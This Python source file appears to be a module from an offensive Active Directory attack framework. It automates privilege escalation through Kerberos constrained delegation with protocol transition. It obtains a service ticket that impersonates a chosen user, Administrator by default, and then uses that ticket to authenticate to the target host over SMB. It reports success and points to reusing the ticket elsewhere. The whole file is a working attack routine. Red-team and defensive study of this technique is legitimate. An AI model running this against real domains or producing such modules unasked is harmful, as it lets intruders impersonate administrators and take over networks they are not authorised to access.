import os

from tool import Tool
from module import BaseModule

class ConstrainedDelegationWithProtocolTransition(BaseModule):
    path = "delegation/constrained_with_pt"
    description = "Privilege Escalation via Constrained Delegation with Protocol Transition"
    info = """Attackers compromise a service account configured for constrained delegation with protocol transition (TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION). This allows them to generate a ticket impersonating any user (without needing their credentials) to access specific services listed in the account's delegation rights.

Prerequisites:
  - Control of an account with the TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION right and a populated msDS-AllowedToDelegateTo attribute (attacker).
  - An SPN listed in the account's msDS-AllowedToDelegateTo attribute (spn).
  - A privileged user account to impersonate that does not have the "Account cannot be delegated" protection enabled. (target user)"""

    options = {
        "dc_ip": {"default": "", "description": "DC IP or host address. If blank, the domain name will be used.", "required": False},
        "target_account": {"default": "Administrator", "description": "Target account to impersonate.", "required": True},
        "target_spn": {"default": "", "description": "Target SPN of the service that trusts the auth account for delegation (only for protocol transition).", "required": True},

        "domain":   {"default": "", "description": "Auth: Domain name (FQDN)", "required": True},
        "username": {"default": "", "description": "Auth: Username", "required": True},
        "password": {"default": "", "description": "Auth: Password or NT Hash (for NTLM auth only)", "required": False},
        "auth": {"default": "ntlm", "description": "Auth: Type (ntlm, krb)", "required": True},
    }
    
    def __init__(self, registry, job_manager):
        super().__init__(registry, job_manager)

    def _target_host_from_spn(self, spn: str) -> str:
        if "/" not in spn:
            return ""
        return spn.split("/", 1)[1].split(":", 1)[0].strip()
   
    async def run(self):
        if not self.validate_options():
            return

        target_host = self._target_host_from_spn(self.opts.target_spn)
        if not target_host:
            self.pane_a.write("[red][!] Invalid `target_spn`. Expected format like cifs/server.domain.local.[/red]")
            return

        os.chdir(self.logs_dir)
        tool = Tool(self)

        tool.title("Perform S4U2Self + S4U2Proxy to obtain a service ticket")
        if not tool.set_auth(from_module=True):
            return
        ticket = await tool.get_st(['-spn', self.opts.target_spn, '-impersonate', self.opts.target_account])
        
        if not ticket:
            return

        tool.title("Authenticate to the target service using smbclient")
        if not tool.set_auth(auth="krb", domain=self.opts.domain, username=self.opts.target_account, ticket=ticket):
            return
        await tool.smbclient(target_host)

        self.pane_b.write(
            f"[green bold]Attack successful. Ticket saved in {ticket} can be used with `ptt {ticket}` in supported modules or external Kerberos-aware tools.[/green bold]"
        )
